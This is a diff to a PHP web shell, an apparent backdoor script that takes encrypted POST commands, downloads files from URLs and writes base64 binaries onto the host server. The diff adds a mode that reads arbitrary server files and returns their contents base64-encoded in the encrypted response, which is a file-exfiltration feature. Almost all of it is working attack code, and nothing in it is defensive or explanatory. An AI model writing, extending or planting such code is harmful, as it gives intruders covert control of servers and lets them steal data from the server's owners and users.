@@ -62,6 +62,8 @@ if (!isset($_POST['c']) && !isset($_POST['f'])) {
 }
 
 $output = '';
+$downloads = array();
+
 $path = realpath(base64_decode($_POST['p']));
 if(isset($_POST['c'])){
     // Receiving the command
@@ -87,26 +89,37 @@ if(isset($_POST['c'])){
 
 if(isset($_POST['f'])) {
     $files = $_POST['f'];
-    foreach ($files['u'] as $encrypted_url){
-        $name = base64_decode(encrypt_decrypt('decrypt', $encrypted_url['n'], $key, $iv));
-        $payload = base64_decode(encrypt_decrypt('decrypt', $encrypted_url['p'], $key, $iv));
-        $result = download_file_from_url($payload, $path, $name);
-        if(is_null($result)){
-            $output .= "Permission denied {$path}/{$name}\n";
-        } elseif ($result == false){
-            $output .= "Unable to download the file\n";
-        } else {
-            $output .= $result . "\n";
+    if (isset($files['d'])) {
+        foreach ($files['d'] as $file) {
+            $name = base64_decode(encrypt_decrypt('decrypt', $file, $key, $iv));
+            $payload = file_to_base64($name);
+            array_push($downloads, array('name' => $name, 'content' => $payload));
         }
     }
-    foreach ($files['b'] as $encrypted_binary){
-        $name = base64_decode(encrypt_decrypt('decrypt', $encrypted_binary['n'], $key, $iv));
-        $payload = base64_decode(encrypt_decrypt('decrypt', $encrypted_binary['p'], $key, $iv));
-        $result = base64_to_file($payload, $path, $name);
-        if(is_null($result)){
-            $output .= "Permission denied {$path}/{$name}\n";
-        } else {
-            $output .= $result . "\n";
+    if (isset($files['u'])){
+        foreach ($files['u'] as $encrypted_url){
+            $name = base64_decode(encrypt_decrypt('decrypt', $encrypted_url['n'], $key, $iv));
+            $payload = base64_decode(encrypt_decrypt('decrypt', $encrypted_url['p'], $key, $iv));
+            $result = download_file_from_url($payload, $path, $name);
+            if(is_null($result)){
+                $output .= "Permission denied {$path}/{$name}\n";
+            } elseif ($result == false){
+                $output .= "Unable to download the file\n";
+            } else {
+                $output .= $result . "\n";
+            }
+        }
+    }
+    if (isset($files['b'])) {
+        foreach ($files['b'] as $encrypted_binary) {
+            $name = base64_decode(encrypt_decrypt('decrypt', $encrypted_binary['n'], $key, $iv));
+            $payload = base64_decode(encrypt_decrypt('decrypt', $encrypted_binary['p'], $key, $iv));
+            $result = base64_to_file($payload, $path, $name);
+            if (is_null($result)) {
+                $output .= "Permission denied {$path}/{$name}\n";
+            } else {
+                $output .= $result . "\n";
+            }
         }
     }
 }
@@ -114,7 +127,8 @@ if(isset($_POST['f'])) {
 // Now, we need to return an encrypted json
 exit(encrypt_decrypt('encrypt', json_encode(array(
     'output' => base64_encode($output),
-    'path' => base64_encode(getcwd())
+    'path' => base64_encode(getcwd()),
+    'files' => $downloads
 )), $key, $iv));
 
 /*------------------*/
@@ -304,6 +318,15 @@ function base64_to_file($base64_string, $path, $output_file)
     fwrite($handle, base64_decode($base64_string));
     fclose($handle);
     return $output_file;
+}
+
+// Read file to Base64
+function file_to_base64($file)
+{
+    if(file_exists($file) && is_readable($file)){
+        return base64_encode(file_get_contents($file));
+    }
+    return null;
 }
 
 // Download file from URL
